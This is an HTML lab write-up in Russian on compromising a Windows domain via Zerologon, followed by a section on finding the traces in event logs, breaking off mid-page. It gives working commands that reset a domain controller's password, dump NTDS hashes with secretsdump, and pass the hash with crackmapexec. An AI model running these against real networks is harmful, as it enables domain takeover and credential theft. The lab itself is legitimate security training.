@@ -1,0 +1,684 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Практическая работа №6.2 Компрометация доменной Windows-инфраструктуры.</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 237, 214, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 237, 214, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(249, 228, 188, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="01c7cf4e-114e-45c8-87b4-eb9e28c2eda0" class="page sans"><header><h1 class="page-title">Практическая работа №6.2 Компрометация доменной Windows-инфраструктуры.</h1><p class="page-description"></p></header><div class="page-body"><hr id="b0a8afa6-d56f-482e-9f26-826b5b180e91"/><h1 id="cc18380e-4510-4d54-bb33-98518f945a19" class="">Занятие 6 - <em>Базовые атаки и компрометация доменной Windows-инфраструктуры</em></h1><p id="1965a841-1fda-40ee-9814-2845720a2eca" class="">Для начала нужно активировать политику аудита машинных учетных записей и применить к контроллерам домена</p><hr id="8c94d727-5c87-4df6-98d6-a1e7f0d8cda6"/><figure id="18931ca5-cf57-430f-a4a1-ec648dfb5ef9" class="image"><a href="https://i.imgur.com/g53Ub2R.png"><img src="https://i.imgur.com/g53Ub2R.png"/></a></figure><hr id="b862e6cd-9673-4c5b-a70f-0e0d16804546"/><p id="224d7a40-64a3-404b-9e98-f3c1e20f457b" class="">Путь до политики:</p><hr id="1aed0d1a-4b87-4831-a486-e602c6f96bc1"/><p id="cb9cf142-fc21-49df-9cdf-e58b9c6fef58" class="">Чтобы политика применилась после настройки, не забудьте ввести команду gpupdate либо перезагрузить контроллер домена</p><hr id="45ae2117-c2ca-4c7c-ba0f-337ad763a1ed"/><h2 id="b9ea9110-2a31-4a92-b1d1-0d362414f1fc" class="">Часть 2. Эксплуатация уязвимостей контроллера домена</h2><p id="e9667afd-bbc4-44a2-9d42-381e0c455069" class="">2.1 Проведем поиск по уязвимости zerologon и найдём множество репозиториев на github,  в том числе и с эксплойтами</p><hr id="51f2ee5e-2d31-48a2-a6ab-adf88e292c32"/><figure id="a8f484e1-961f-4c6e-b62e-88554ca472ae" class="image"><a href="https://i.imgur.com/ZmC6Im1.png"><img src="https://i.imgur.com/ZmC6Im1.png"/></a></figure><hr id="38e7cf0c-a9ef-4442-b28b-e961fff3313c"/><p id="e293d08c-a061-4dd5-896c-ab029c606227" class="">Вы можете провести поиск самостоятельно и обнаружить другие репозитории с другими эксплойтами для zerologon</p><hr id="235b1115-de4f-426c-9bb9-c34f5700acbf"/><p id="fc30de4b-cddf-41c3-944e-766a76e820e2" class="">2.2 Скачаем один из них</p><hr id="a127aee5-a281-4d67-aeff-9ac920356170"/><figure id="55c9de84-4e78-4569-b7d2-caaebb187c22" class="image"><a href="https://i.imgur.com/OpFCMrv.png"><img src="https://i.imgur.com/OpFCMrv.png"/></a></figure><hr id="b096372e-51a1-4185-9438-b0f23a80b4d3"/><p id="2c8a3578-0e28-4b57-862f-199df7d3f4a9" class="">Использована команда</p><hr id="093ff620-a364-4348-9f24-52452e1402f2"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2aa5efee-8229-4da2-8611-9d02a6a35709" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">git clone &lt;https://github.com/risksense/zerologon</code></pre><hr id="a5a71b68-b6a6-426c-86dc-2fd07e1a1bfc"/><p id="c09cbd81-c4cf-4787-a175-6ec620a22103" class="">2.3 Перейдем в скачанную папку и прочитаем README</p><hr id="340d1119-ead6-4172-970f-9b7a1e6526a5"/><figure id="ba774438-22c3-498d-b90e-dd739c4d6b93" class="image"><a href="https://i.imgur.com/FUoUp2h.png"><img src="https://i.imgur.com/FUoUp2h.png"/></a></figure><hr id="704a6b2c-67c2-4f83-ba21-e3dd5a19a7cd"/><p id="1b8ddaeb-7606-4e82-80e0-4409121b41f5" class="">2.4 Нам предлагают использовать консткукцию  для вызова эксплойта. Используем команду</p><hr id="8e8aa3a1-530f-4da7-91db-4f5401c07959"/><figure id="abf1dd32-7320-449f-9ab3-f8bbadb91dd7" class="image"><a href="https://i.imgur.com/vWxMc81.png"><img src="https://i.imgur.com/vWxMc81.png"/></a></figure><hr id="e804b6c4-a17d-42f9-be86-ad2b4e257897"/><p id="b4836c2e-29be-4d8b-9a8d-8f5551010397" class="">Использована команда</p><hr id="183c69f4-68d4-4061-9d9b-c6d420cb08dd"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="59812ea9-bed0-47ce-b4e4-4c0b26c344a2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 set_empty_pw.py DC1 192.168.10.200</code></pre><hr id="538ba912-9fa0-4388-b632-730195fe1129"/><p id="b870ce45-d9a9-4365-b3c8-38c65ce22092" class="">2.5 Скрипт обнулил пароль машинной учетной записи контроллера домена. Воспользуемся этим, чтобы сдампить NTDS с помощью secretsdump</p><hr id="bf37375f-6942-4788-8018-c89d7b79d667"/><figure id="712aa63b-3e13-483c-983a-195cdca0aae5" class="image"><a href="https://i.imgur.com/PvEmTkJ.png"><img src="https://i.imgur.com/PvEmTkJ.png"/></a></figure><hr id="57d83d14-2c0f-4dce-8fda-793145413277"/><p id="8a26e690-2850-44d3-85fe-974d7eb79a82" class="">2.6 Команда не найдена. Значит, нужно скачать этот инструмент. Он находится в составе пакета пентестерских утилит impacket</p><hr id="87a070cc-a1ac-47ac-8f83-2ddb15b2462b"/><figure id="16b86a53-2c47-4637-bc6a-921e328eb13b" class="image"><a href="https://i.imgur.com/BsJApIk.png"><img src="https://i.imgur.com/BsJApIk.png"/></a></figure><hr id="b2818731-f317-40d3-8079-77ba1109c69b"/><p id="659fe56d-a259-425e-a090-689ed54460db" class="">Использована команда</p><hr id="8ec170bb-b2bc-4985-89a2-0e87509ab596"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d4360152-f917-4c56-9c1d-bade05b25bdc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">git clone &lt;https://github.com/SecureAuthCorp/impacket</code></pre><hr id="d90f8963-94ee-4b7e-80b2-715cf66b2b1d"/><p id="09d09a49-afd5-4d04-adc1-853d6ec3ec41" class="">2.7 Перейдём в impacket/examples и выполним оттуда команду</p><hr id="79f4f54f-5016-4892-8264-031cc1900539"/><figure id="96ea277a-d3a2-4a9e-bdf7-02e61fcc8876" class="image"><a href="https://i.imgur.com/C0C44oU.png"><img src="https://i.imgur.com/C0C44oU.png"/></a></figure><hr id="286759a8-af8c-4d2f-9dab-23f41b64f6a2"/><p id="8286acaa-2339-4a82-b8cd-a41fcca00582" class="">Использована команда</p><hr id="609ac742-0230-4d26-8912-3242a4c4445f"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8982a515-8935-404c-b78d-9a8c3e2d100f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 &#x27;PT/DC1$@192.168.10.200&#x27;</code></pre><hr id="0b7ac819-72d0-4194-91e2-ee2ab774bfdc"/><p id="e9894756-8f0c-4806-b7ae-e38ecf008f99" class="">2.8 С помощью полученных хешей учетных данных можно выполнять команды от любого пользователя</p><hr id="5fcee631-d236-4856-8e71-7eeb8a378d51"/><figure id="221ef8c5-c0b2-4045-b35f-b71202302085" class="image"><a href="https://i.imgur.com/hBhNhCy.png"><img src="https://i.imgur.com/hBhNhCy.png"/></a></figure><hr id="441e8561-3473-4d75-889a-7a1b12709d9e"/><p id="943fa0ad-ebe6-4b50-8a9c-e0cd8945ec78" class="">Использована команда</p><hr id="41992697-2332-4308-8ff5-348001892cef"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="93c10455-dcbf-4d30-8f81-84db221fea2f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">crackmapexec smb 192.168.10.200 -u ADMPetr -H 05df2fd1109e3d3b60f110965f6af128 -x whoami</code></pre><hr id="d838e18b-ec00-408a-8f6b-aa4741a9332d"/><h2 id="d5691999-15b6-4ef3-b9a2-c62ea464652a" class="">Часть 3. Поиск следов эксплуатации уязвимостей</h2><p id="406c4579-6e29-42aa-a391-1cf65ff499b6" class="">3.1 Проверим журнал System, увидим ошибку Netlogon</p><hr id="5a6b0b12-4714-4d84-a672-87f06141ec95"/><figure id="37b289dc-e64a-4e50-8972-ad163baa3e00" class="image"><a href="https://i.imgur.com/FE4vFVt.png"><img src="https://i.imgur.com/FE4vFVt.png"/></a></figure><hr id="5bd89cc3-8ff4-44b2-95c6-7336d768867f"/><p id="38a62c4b-6742-4cb1-97db-eb83b9cc81f5" class="">3.1 Проверим Security, увидим событие 4742</p><hr id="065781d5-62be-4a4a-8cef-7af878b95fc6"/><figure id="9c4ddbfa-e340-4243-8f03-d1015aa2988f" class="image"><a href="https://i.imgur.com/TIaWQXc.png"><img src="https://i.imgur.com/TIaWQXc.png"/></a></figure><hr id="155783d1-9680-4209-81f3-5f0ee79bc786"/><p id="9a2a777b-0e3d-4f36-a920-84ea9524a70e" class="">3.1 Внимательно проанализируем событие</p><hr id="2df1ebb5-f3e9-4f4c-8042-93743a3124b1"/><figure id="9cfe5b37-9ad9-4fff-b297-9d4252320e79" class="image"><a href="https://i.imgur.com/IB1NWJj.png"><img src="https://i.imgur.com/IB1NWJj.png"/></a></figure><hr id="3d2d8d63-9a02-4a1c-8713-e0dec893de80"/><p 